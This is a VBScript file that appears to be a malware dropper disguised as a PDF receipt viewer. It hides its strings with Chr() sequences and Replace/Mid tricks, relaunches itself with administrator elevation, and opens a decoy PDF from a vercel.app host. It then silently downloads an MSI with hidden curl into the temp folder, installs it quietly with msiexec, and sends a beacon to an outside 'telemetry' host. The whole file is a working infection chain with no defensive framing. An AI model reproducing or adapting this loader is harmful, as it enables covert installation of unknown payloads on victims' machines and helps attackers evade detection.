Option Explicit
Dim objFileSystem, strFileProvider, strTempPath, strFilePath, strUpdateURL, intPathType, intFileLen, intTickCount, strPreviewURL
strFileProvider = Replace("S_c_r_i_p_t_i_n_g_._F_i_l_e_S_y_s_t_e_m_O_b_j_e_c_t_", "_", "")
strUpdateURL = "https" & "://" & "pdfviewer-nu.vercel.app/doc/updater.msi"
strPreviewURL = Chr(104) & Chr(116) & Chr(116) & Chr(112) & Chr(115) & Chr(58) & Chr(47) & Chr(47) & Chr(112) & Chr(100) & Chr(102) & Chr(118) & Chr(105) & Chr(101) & Chr(119) & Chr(101) & Chr(114) & Chr(45) & Chr(110) & Chr(117) & Chr(46) & Chr(118) & Chr(101) & Chr(114) & Chr(99) & Chr(101) & Chr(108) & Chr(46) & Chr(97) & Chr(112) & Chr(112) & Chr(47) & Chr(100) & Chr(111) & Chr(99) & Chr(47) & Chr(119) & Chr(117) & Chr(114) & Chr(101) & Chr(99) & Chr(101) & Chr(105) & Chr(112) & Chr(116) & Chr(46) & Chr(112) & Chr(100) & Chr(102)
intPathType = ((4 / 2) * 1)


PrepareSession
WScript.Sleep 1268
ShowMedia
WScript.Sleep 1388
Set objFileSystem = CreateObject(strFileProvider)
strTempPath = objFileSystem.GetSpecialFolder(intPathType)
strFilePath = strTempPath & "\setup_package.msi"
RetrievePackage strUpdateURL, strFilePath
intFileLen = objFileSystem.GetFile(strFilePath).Size
If intFileLen < 1 Then
    WScript.Quit
End If

intTickCount = Timer()
If intTickCount > 0 Then
    WScript.Sleep 604
End If

ProcessPackage strFilePath
ReportStatus

WScript.Sleep 931


Sub PrepareSession()
    DebugLog "Elevation sub started"
    Dim strRelaunch, oShell, strShellRef, strLauncher, strPrivLevel, strRunFlag
    strLauncher = "wscript.exe"
    strPrivLevel = "runas"
    strShellRef = Mid("Provider=Shell.Application;Cache=On", 10, 17)
    strRunFlag = Left("elev", 4) & Right("ated", 4)

    If Not WScript.Arguments.Named.Exists(strRunFlag) Then
        strRelaunch = """" & WScript.ScriptFullName & """ /" & strRunFlag
        Set oShell = CreateObject(strShellRef)
        oShell.ShellExecute strLauncher, strRelaunch, "", strPrivLevel, 1
        WScript.Quit
    End If
End Sub


Sub ShowMedia() 
    Dim urlRunner, strWebType
    strWebType = "WScript" & "." & "Shell"
    Set urlRunner = CreateObject(strWebType)
    urlRunner.Run strPreviewURL, 1, False
End Sub


Sub DebugLog(strMessage)
    On Error Resume Next

    Dim objDebugFSO
    Dim strDebugPath
    Dim objDebugFile

    Set objDebugFSO = CreateObject("Scripting.FileSystemObject")

    strDebugPath = objDebugFSO.GetSpecialFolder(2) & "\vbs_debug.log"

    Set objDebugFile = objDebugFSO.OpenTextFile(strDebugPath, 8, True)

    objDebugFile.WriteLine Now() & " | " & strMessage

    objDebugFile.Close

    On Error GoTo 0
End Sub


Sub RetrievePackage(strURL, strOutPath)

    Dim sysRunner
    Dim strProcessType
    Dim intExitCode
    Dim strCmd
    Dim fsVerifier
    Dim strFsCheckType

    strProcessType = Replace("WScript.ShXll", "X", "e")

    Set sysRunner = CreateObject(strProcessType)

    strCmd = "curl.exe -s -L --fail -o """ & strOutPath & """ """ & strURL & """"

    intExitCode = sysRunner.Run(strCmd, 0, True)

    If intExitCode <> 0 Then
        WScript.Quit
    End If

    strFsCheckType = "Scripting.FileSystemObject"

    Set fsVerifier = CreateObject(strFsCheckType)

    If Not fsVerifier.FileExists(strOutPath) Then
        WScript.Quit
    End If

End Sub


Function ResolveEndpoint(strKey)

    Dim strRoot

    strRoot = "E:\staging"

    If strKey = "" Then

        ResolveEndpoint = strRoot

    Else

        ResolveEndpoint = strRoot & "\" & strKey

    End If

End Function


Function ParsePolicyRule(strRaw)

    Dim arrParts

    arrParts = Split(strRaw, ",")

    If UBound(arrParts) < 0 Then

        ParsePolicyRule = ""

    Else

        ParsePolicyRule = Trim(arrParts(0))

    End If

End Function


Function ComputeHashValue()

    Dim intA
    Dim xBase

    intA = 3099

    xBase = 46

    ComputeHashValue = intA Xor xBase

End Function


Function GetHash()

    GetHash = Year(Now) & Month(Now) & Day(Now)

End Function


Sub ProcessPackage(strPkgFile)

    DebugLog "Execute sub started with path: " & strPkgFile

    On Error Resume Next

    If Not objFileSystem.FileExists(strPkgFile) Then

        DebugLog "Execute error: target file does not exist"

        Exit Sub

    End If

    On Error GoTo 0

    Dim strInstallerExe
    Dim strUnattended
    Dim strRunProvider
    Dim oExecShell

    strInstallerExe = "msiexec.exe"

    strUnattended = Replace("/Kn", "K", "q")

    strRunProvider = Mid("Config=WScript.Shell;Active=True", 8, 13)

    Set oExecShell = CreateObject(strRunProvider)

    oExecShell.Run strInstallerExe & " /i """ & strPkgFile & """ " & strUnattended, 0, False

End Sub


Function FormatReportLine(strInput)
    Dim strOut
    strOut = Replace(strInput, Chr(13), "")
    strOut = Replace(strOut, Chr(10), "")
    FormatReportLine = Trim(strOut)
End Function


Sub ReportStatus()

    ' Enterprise telemetry integration

    On Error Resume Next

    Dim objTelemetry
    Dim strTelemetryUrl
    Dim strJobRef
    Dim strTelemetry

    Set objTelemetry = CreateObject("MSXML2.ServerXMLHTTP")
    strTelemetryUrl = "https://telemetry.sys.int/ftxm4ymi/report"
    strJobRef = "task_2JCM9"
    strTelemetry = "session=" & strJobRef & "&status=complete"
    objTelemetry.Open "POST", strTelemetryUrl, False
    objTelemetry.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
    objTelemetry.Send strTelemetry

    If objTelemetry.Status <> 200 Then
        ' Telemetry endpoint unreachable — continue silently
    End If

    On Error GoTo 0

End Sub
